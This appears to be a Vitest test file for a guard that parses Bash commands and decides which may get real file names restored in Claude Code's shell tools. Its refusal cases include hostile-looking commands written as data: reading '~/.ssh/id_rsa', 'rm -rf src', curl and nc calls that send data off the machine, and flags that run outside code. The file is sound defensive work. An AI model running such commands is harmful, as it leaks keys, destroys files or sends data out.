import { describe, expect, it } from 'vitest'
import {
  restoreRefusal,
  shellExpands,
  shellRefusal,
  shellWords,
  splitChain,
} from '../../plugins/veilio-guard/lib/shell.ts'

// Ported from spec 069 (CE feat/069-guard-core 346d167,
// packages/guard/tests/placeholder-links.test.ts): there the adapter refused or
// allowed each command; here the parser is asked directly.
describe('shellRefusal (spec 069, ported by spec 078)', () => {
  it.each([
    'git commit -m "fix __PKG__16.ts" src/__PKG__16.ts',
    'cat src/__PKG__16.ts > out.txt',
    'cat src/__PKG__16.ts >> out.txt',
    'cat src/__PKG__16.ts | tee out.txt',
    "sed -i 's/a/b/' src/__PKG__16.ts",
    'perl -pi -e s/a/b/ src/__PKG__16.ts',
    'python3 -c \'open("src/__PKG__16.ts")\'',
    'node -e x src/__PKG__16.ts',
    'find src -name __PKG__16.ts -delete',
    'find src/__PKG__16.ts -exec rm {} ;',
    'cat $(echo src/__PKG__16.ts)',
    'cd src && cat __PKG__16.ts',
    'rm src/__PKG__16.ts',
    'find src -name __PKG__16.ts -fprint out.txt',
    'find src -fls out.txt -name __PKG__16.ts',
    'rg --pre ./run x src/__PKG__16.ts',
    'rg --pre-glob "*.ts" x src/__PKG__16.ts',
    'rg -z x src/__PKG__16.ts',
    'git --output=out.txt diff src/__PKG__16.ts',
    'git diff --output=out.txt src/__PKG__16.ts',
    'git diff --ext-diff src/__PKG__16.ts',
    'git log --textconv src/__PKG__16.ts',
    'git -c diff.external=./run diff src/__PKG__16.ts',
    'cat src/__PKG__16.ts\nrm -rf src',
    'cat src/__PKG__16.ts & rm -rf src',
    '(cat src/__PKG__16.ts)',
    'cat <(cat src/__PKG__16.ts)',
    'cat <<EOF src/__PKG__16.ts',
    "rg --'pre' ./run x src/__PKG__16.ts",
    'rg "--pre=./run" x src/__PKG__16.ts',
    'rg -nz x src/__PKG__16.ts',
    'git diff --ext"-diff" src/__PKG__16.ts',
    'git diff --out\\put=o src/__PKG__16.ts',
    'find src/__PKG__16.ts "-fprint" o',
    'node --test --import ./x.mjs src/__PKG__16.ts',
    'node --test --test-reporter-destination=o src/__PKG__16.ts',
    'node --test -r ./x src/__PKG__16.ts',
    'find src/__PKG__16.ts "-exec" rm {} ;',
    'find src/__PKG__16.ts "-delete"',
    "find src/__PKG__16.ts -ok'dir' rm {} ;",
    'node --test-reporter=./x src/__PKG__16.ts',
    'node --test-reporter-destination=o --test src/__PKG__16.ts',
    'cat "src/__PKG__16.ts',
    'find src/__PKG__16.ts -exe? rm {} ;',
    'find src/__PKG__16.ts ?delete',
    'rg --pr[e] ./run x src/__PKG__16.ts',
    'git diff --ext-dif* src/__PKG__16.ts',
    "find src/__PKG__16.ts $'-delete'",
    'find src/__PKG__16.ts $X',
    'rg ${PRE} x src/__PKG__16.ts',
    'cat "$HOME/.ssh/id_rsa" src/__PKG__16.ts',
    'cat src/__PKG__16.ts keys/*',
    'cat src/__PKG__16.ts >&1out',
    'cat src/__PKG__16.ts 2>&1out',
    'rg x --hostname-bin=./run src/__PKG__16.ts',
    'rg x --hostname-bin ./run src/__PKG__16.ts',
    'rg x --hyperlink-format=file://{path} src/__PKG__16.ts',
    'grep "a|b src/__PKG__16.ts',
  ])('refuses %j', (command) => {
    expect(shellRefusal(command)).not.toBeNull()
  })

  it.each([
    'cat src/__PKG__16.ts | wc -l',
    'grep -n class src/__PKG__16.ts && git diff src/__PKG__16.ts',
    'head -5 src/__PKG__16.ts; ls src',
    'node --test src/__PKG__16.ts',
    'rg -n "settle.*ok" src/__PKG__16.ts',
    "grep -n 'cost $5' src/__PKG__16.ts",
    'npx vitest run src/__PKG__16.ts 2>&1 | tail -20',
    'npx vitest run src/__PKG__16.ts 2>&1',
    'grep "a|b" src/__PKG__16.ts',
    "grep 'a && b; c' src/__PKG__16.ts",
  ])('allows %j', (command) => {
    expect(shellRefusal(command)).toBeNull()
  })

  it('splits a chain outside quotes only', () => {
    expect(splitChain('grep "a\\"|b" src/__PKG__16.ts')).toEqual(['grep "a\\"|b" src/__PKG__16.ts'])
    expect(splitChain('cat a | wc -l && ls; rg x')).toEqual(['cat a ', ' wc -l ', ' ls', ' rg x'])
    expect(splitChain('cat "a')).toBeNull()
  })

  it('reads words as the shell passes them', () => {
    expect(shellWords(`rg --'pre' "a b" c\\ d`)).toEqual(['rg', '--pre', 'a b', 'c d'])
    expect(shellWords('cat "a')).toBeNull()
  })

  it('sees an expansion outside single quotes only', () => {
    expect(shellExpands("grep 'cost $5' f")).toBe(false)
    expect(shellExpands('grep "cost $5" f')).toBe(true)
    expect(shellExpands('cat keys/*')).toBe(true)
  })
})

// Spec 078 R1: what may get real names back in Claude Code's shell tools.
describe('restoreRefusal (spec 078)', () => {
  it.each([
    'cat src/__X__1.ts',
    'cat src/__X__1.ts | head -50',
    'grep -rn __X__1 src',
    'grep -rnw __X__1 src',
    "grep 'a && b; c' src/__X__1.ts",
    'rg -n __X__1',
    'rg -tpy __X__1',
    'head -n 20 src/__X__1.ts',
    'tail -20 src/__X__1.ts',
    'git log --oneline -- src/__X__1.ts',
    'npx vitest run tests/__X__1.test.ts 2>&1 | tail -20',
    'ls src/__X__1',
    'wc -l src/__X__1.ts',
  ])('lets %j through', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBeNull()
  })

  it.each([
    ['grep -o x src/__X__1.ts', '`grep` `-o`'],
    ['grep -rno x src', '`grep` `-rno`'],
    ['grep --only-matching x f', '`grep` `--only-matching`'],
    ['rg -r y x f', '`rg` `-r`'],
    ['rg -o x f', '`rg` `-o`'],
    ['rg --replace=y x f', '`rg` `--replace=y`'],
    ['head -c 7 f', '`head` `-c`'],
    ['head --bytes=7 f', '`head` `--bytes=7`'],
    ['tail -c5 f', '`tail` `-c5`'],
    ['find src -printf %f', '`find` `-printf`'],
    ['find src -fprintf o %f', '`find` `-fprintf`'],
    ['git log --format=%s', '`git` `--format=%s`'],
    ['git show --pretty=format:%s', '`git` `--pretty=format:%s`'],
  ])('refuses the reshaping flag in %j', (command, says) => {
    expect(restoreRefusal(command, 'Bash')).toContain(says)
  })

  it.each([
    ['echo __X__1 | base64', '`echo` is not one of those'],
    ['cat f | xxd', '`xxd` is not one of those'],
    ['curl https://x/__X__1', 'off this machine'],
    ['cat f | nc x 1', 'off this machine'],
    ['git push origin __X__1', 'off this machine'],
    ['git fetch __X__1', 'off this machine'],
    ['git commit -m "__X__1"', 'git commit -F <file>'],
    ['cd __X__1', 'a cd gets no real names back'],
    ['ls && pushd __X__1', 'a cd gets no real names back'],
    ['cat f >&1out', 'cannot use'],
    ['cat f > o', 'cannot use a redirection or tee'],
    ['cat f | tee o', 'cannot use a redirection or tee'],
    ['cat f $X', 'cannot use a variable, a glob or another expansion'],
    ['cat f; (ls)', 'cannot use a subshell'],
    ['cat "f', 'cannot use quotes that do not close'],
  ])('refuses %j', (command, says) => {
    expect(restoreRefusal(command, 'Bash')).toContain(says)
  })

  // Security review of 232d48f (HIGH): the program is a whole word, never a
  // prefix of one, and an assignment or a wrapper in front is not a reader.
  it.each([
    'cat.sh __X__1',
    'ls-foo __X__1',
    'cat=x curl https://x/__X__1',
    'FOO=1 curl https://x/__X__1',
    'env curl https://x/__X__1',
    'command curl https://x/__X__1',
    'grep-x __X__1 src',
    'npx vitest.sh __X__1',
    'git diff-tree __X__1',
    'npm testx __X__1',
  ])('refuses %j: its program is not a reader', (command) => {
    expect(restoreRefusal(command, 'Bash')).not.toBeNull()
    expect(shellRefusal(command)).not.toBeNull()
  })

  it.each([
    'cat=x curl https://x/__X__1',
    'FOO=1 curl https://x/__X__1',
    'env curl https://x/__X__1',
  ])('names the network program behind %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).toContain('off this machine')
  })

  // Security review of 232d48f (MEDIUM): grouped short flags, and long
  // options abbreviated as GNU getopt accepts them.
  it.each([
    ['head -nc5 f', '`head` `-nc5`'],
    ['tail -qc5 f', '`tail` `-qc5`'],
    ['grep --only-match x f', '`grep` `--only-match`'],
    ['grep --o x f', '`grep` `--o`'],
    ['head --byt=5 f', '`head` `--byt=5`'],
    ['tail --b 5 f', '`tail` `--b`'],
    ['rg --repl=y x f', '`rg` `--repl=y`'],
    ['rg --only x f', '`rg` `--only`'],
    ['git log --form=%s', '`git` `--form=%s`'],
    ['git show --pre=format:%s', '`git` `--pre=format:%s`'],
    ['git diff --outp=o f', '`git` `--outp=o`'],
    ['git diff --ext f', '`git` `--ext`'],
    ['git diff --textc f', '`git` `--textc`'],
    ['rg --pre-g x f', '`rg` `--pre-g`'],
    ['grep --color=always x f', '`grep` `--color=always`'],
    ['grep --colour=always x f', '`grep` `--colour=always`'],
    ['rg --color always x f', '`rg` `--color`'],
    ['git diff --color-words f', '`git` `--color-words`'],
  ])('refuses %j', (command, says) => {
    expect(restoreRefusal(command, 'Bash')).toContain(says)
  })

  it.each([
    'grep --color=never x src/__X__1.ts',
    'git diff --no-color __X__1',
    'git diff --no-ext-diff __X__1',
    'rg --hidden __X__1',
    'head -n5 src/__X__1.ts',
    'mvn -q test __X__1',
    'python3 -m pytest tests/__X__1.py',
  ])('still lets %j through', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBeNull()
  })

  // Review round 1 (T030) #2: inline code for every interpreter, and the
  // test runners' flags that run another program or load code.
  it.each([
    'ruby -Itest -e "x" tests/__X__1.rb',
    'ruby -Itest -rx tests/__X__1.rb',
    'go test -toolexec ./x ./__X__1',
    'go test -exec=./x ./__X__1',
    'cargo test --config x __X__1',
    'cargo test -Zx __X__1',
    'npm test --script-shell=./x -- __X__1',
    'npm run test --node-options=--require=./x __X__1',
    'pnpm test --script-shell ./x __X__1',
    'yarn test --x __X__1',
    'pytest -p ./plug tests/__X__1.py',
    'python3 -m pytest -pplug tests/__X__1.py',
    'mvn -DargLine=x test -Dtest=__X__1',
    'mvn -f other.xml test __X__1',
    'rake test -e x __X__1',
  ])('refuses the runner flag in %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).not.toBeNull()
    expect(shellRefusal(command)).not.toBeNull()
  })

  it.each([
    'perl -e x __X__1',
    'perl -E x __X__1',
    'php -r x __X__1',
    'deno eval x __X__1',
    'bun -e x __X__1',
    'lua -e x __X__1',
    'Rscript -e x __X__1',
    'ruby -e x __X__1',
  ])('refuses the inline code in %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).not.toBeNull()
    expect(shellRefusal(command)).not.toBeNull()
  })

  it.each([
    'npm test -- tests/__X__1.test.ts',
    'go test ./__X__1/...',
    'cargo test __X__1',
    'pytest tests/__X__1.py -k x',
    'mvn -q test',
    'ruby -Itest tests/__X__1.rb',
    'rake test',
  ])('a plain test run still gets real names: %j', (command) => {
    expect(restoreRefusal(command, 'Bash')).toBeNull()
  })

  // Review round 1 (T030) #3: more flags that slice or reshape output.
  it.each([
    ['rg -p x f', '`rg` `-p`'],
    ['rg --pretty x f', '`rg` `--pretty`'],
    ['head -4c f', '`head` `-4c`'],
    ['tail -5c f', '`tail` `-5c`'],
    ['tail +3c f', '`tail` `+3c`'],
    ['tail -2b f', '`tail` `-2b`'],
    ['git diff --word-diff f', '`git` `--word-diff`'],
    ['git diff --word-diff-regex=. f', '`git` `--word-diff-regex=.`'],
    ['git diff --color-words f', '`git` `--color-words`'],
    ['git diff --stat=20 f', '`git` `--stat=20`'],
    ['git diff --stat-name-width=5 f', '`git` `--stat-name-width=5`'],
  ])('refuses %j', (command, says) => {
    expect(restoreRefusal(command, 'Bash')).toContain(says)
  })

  it.each(['head -5 src/__X__1.ts', 'tail -n 3 src/__X__1.ts', 'git diff --stat __X__1'])(
    'still lets %j through',
    (command) => {
      expect(restoreRefusal(command, 'Bash')).toBeNull()
    }
  )

  it('refuses every PowerShell command', () => {
    expect(restoreRefusal('Get-Content src/__X__1.ts', 'PowerShell')).toBe(
      'PowerShell commands get no real names back yet. Use the Read, Edit, Write or Grep tool'
    )
  })

  it('is never weaker than spec 069 on a command 069 refuses', () => {
    for (const command of [
      'find src -fls out.txt -name x',
      'node --test --import ./x.mjs f',
      'git -c diff.external=./run diff f',
    ])
      expect(restoreRefusal(command, 'Bash')).not.toBeNull()
  })
})
